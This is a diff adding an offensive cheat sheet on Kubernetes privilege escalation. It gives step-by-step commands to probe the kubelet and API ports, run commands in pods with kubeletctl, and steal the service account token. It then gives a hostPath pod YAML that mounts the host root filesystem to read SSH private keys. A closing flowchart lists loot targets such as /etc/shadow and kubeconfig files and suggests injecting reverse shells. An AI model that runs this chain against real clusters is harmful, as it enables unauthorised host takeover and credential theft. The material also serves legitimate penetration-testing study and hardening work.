@@ -1,0 +1,197 @@
+🧠 Kubernetes Privilege Escalation - Summary & Workflow
+🔍 Kubernetes Overview (K8s)
+Kubernetes = container orchestration platform.
+
+Runs containers in pods, which live on worker nodes.
+
+All pods are controlled via the control plane (master).
+
+Secure by design — but if misconfigured, it's a gold mine for attackers.
+
+🏗️ Core Components
+✅ Control Plane (Master Node)
+Handles:
+
+Scheduling (where pods go)
+
+Cluster state (etcd DB)
+
+Exposes the API (used via kubectl, kubelet, etc.)
+
+Ports to watch:
+
+Service	Port
+etcd	2379/2380
+K8s API server	6443
+Kubelet API (read)	10255
+Kubelet API (admin)	10250
+✅ Worker Nodes (Minions)
+Actually run the containers.
+
+Controlled by the master node.
+
+Each pod = isolated app instance, with its own IP, storage, etc.
+
+🔓 Initial Enumeration Steps
+Check if you’re inside a pod:
+
+bash
+Copy
+Edit
+ps aux | grep kube
+Ping the Kubernetes API from inside the pod:
+
+bash
+Copy
+Edit
+curl -k https://<IP>:6443
+If you get a 403 with system:anonymous, you’re unauthenticated but possibly able to enumerate some stuff.
+
+Try Kubelet unauthenticated:
+
+bash
+Copy
+Edit
+curl -k https://<IP>:10250/pods | jq .
+Or with kubeletctl:
+
+bash
+Copy
+Edit
+kubeletctl --server <IP> pods
+🧪 What You Might Discover
+Running pods and containers
+
+Metadata like:
+
+Image versions
+
+Namespace structure
+
+Applied configs
+
+Potential secrets
+
+🚨 Remote Command Execution Check
+Scan all pods for RCE access:
+
+bash
+Copy
+Edit
+kubeletctl --server <IP> scan rce
+If RCE: +, try this:
+
+bash
+Copy
+Edit
+kubeletctl --server <IP> exec "id" -p <pod> -c <container>
+Root inside? Game on.
+
+🛠️ Escalate Privileges with Service Account Token
+From inside the container (if root), grab the token and cert:
+
+bash
+Copy
+Edit
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+Use it to authenticate to the API:
+
+bash
+Copy
+Edit
+export token=$(cat token)
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list
+Check for verbs like:
+
+create
+
+list
+
+get
+
+exec
+
+If you have these for pods, you can do almost anything.
+
+🧬 Create a Privileged Pod to Escape
+Write a YAML file to mount host root /:
+
+yaml
+Copy
+Edit
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /mnt/root
+      name: host-root
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
+  hostNetwork: true
+  automountServiceAccountToken: true
+Apply the pod:
+
+bash
+Copy
+Edit
+kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml
+Drop in and extract keys, passwords, sensitive configs:
+
+bash
+Copy
+Edit
+kubeletctl --server <IP> exec "cat /mnt/root/root/.ssh/id_rsa" -p privesc -c privesc
+🔁 Kubernetes Privilege Escalation - ITTT Flowchart
+markdown
+Copy
+Edit
+🎯 Goal: Privilege Escalation from Pod → Cluster → Host
+
+IF inside a K8s Pod:
+    THEN check access to kubelet API (10250):
+        → IF accessible:
+            → ENUMERATE pods, namespaces, images, and configs
+            → TRY RCE via kubeletctl scan rce
+                → IF RCE works AND root inside container:
+                    → cat /var/run/secrets/.../token
+                    → cat /var/run/secrets/.../ca.crt
+                    → EXPORT token + cert
+
+                    THEN:
+                        → Use kubectl to run: 
+                          auth can-i --list
+
+                        IF can create pods:
+                            → Create pod with hostPath: /
+                            → Mount host FS to /mnt/root
+                            → EXEC into pod, loot /mnt/root
+                            → Look for:
+                                - id_rsa
+                                - /etc/shadow
+                                - /etc/kubernetes
+                                - .kube/config
+                        ELSE:
+                            → Use RCE access to:
+                                - Inject reverse shell
+                                - Dump secrets
+                                - Pivot laterally
+
+        ELSE try 6443 API endpoint:
+            → curl -k https://<IP>:6443
+            → IF 403 with "system:anonymous"
+                → Not authenticated. Try other auth methods or loot more.
+
+        IF kubeletctl not available:
+            → curl manually
+            → Look in /var/run/secrets/... for service account
+
+        IF token grants perms like get/create/exec:
+            → Same pod creation / escape strategy applies
